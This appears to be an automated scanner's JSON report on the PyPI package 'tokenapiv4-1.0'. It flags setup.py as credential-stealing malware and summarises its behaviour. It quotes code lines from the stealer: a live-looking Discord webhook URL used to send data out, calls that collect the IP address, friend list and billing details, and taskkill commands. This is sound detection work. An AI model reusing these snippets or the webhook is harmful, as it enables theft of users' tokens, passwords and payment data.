{
  "package_name": "tokenapiv4-1.0",
  "total_matches": 8,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 8,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is a credential stealer (stealer malware). It performs the following malicious actions: (1) Extracts Discord tokens, browser passwords, and cookies from the victim's machine by searching browser and Discord directories, decrypting stored credentials, and collecting them. (2) Exfiltrates sensitive data (tokens, passwords, cookies, files) to an external Discord webhook (https://discord.com/api/webhooks/1055467493507989585/y-r8YyKL6FKJlBU6tlqmD2X45q2JR2J9hOv78PHpvDr0rIxMmDjrK1gluiidu7Q72W4C). (3) Collects additional information such as IP address, geolocation, and user information. (4) Searches for files with sensitive keywords (e.g., 'password', 'wallet', 'crypto') on the user's Desktop, Downloads, and Documents folders and uploads them. (5) Kills processes (e.g., browsers, Telegram) to access locked files. (6) Uses subprocess to install dependencies without user consent. (7) The code is heavily obfuscated with leetspeak and misleading comments, and the setup() call at the end is a decoy to appear as a legitimate package. All these behaviors are consistent with information-stealing malware.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "24",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "hook = \"https://discord.com/api/webhooks/1055467493507989585/y-r8YyKL6FKJlBU6tlqmD2X45q2JR2J9hOv78PHpvDr0rIxMmDjrK1gluiidu7Q72W4C\"",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at tokenapiv4-1.0/setup.py:24",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        },
        {
          "line_number": "31",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at tokenapiv4-1.0/setup.py:31",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        },
        {
          "line_number": "162",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "friendlist = loads(urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at tokenapiv4-1.0/setup.py:162",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        },
        {
          "line_number": "187",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "billingjson = loads(urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode())",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at tokenapiv4-1.0/setup.py:187",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        },
        {
          "line_number": "875",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.co...lix.com)'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at tokenapiv4-1.0/setup.py:875",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        },
        {
          "line_number": "43",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at tokenapiv4-1.0/setup.py:43",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        },
        {
          "line_number": "641",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at tokenapiv4-1.0/setup.py:641",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        },
        {
          "line_number": "667",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at tokenapiv4-1.0/setup.py:667",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/tokenapiv4-1.0/tokenapiv4-1.0/setup.py",
          "relative_path": "tokenapiv4-1.0/setup.py"
        }
      ]
    }
  ]
}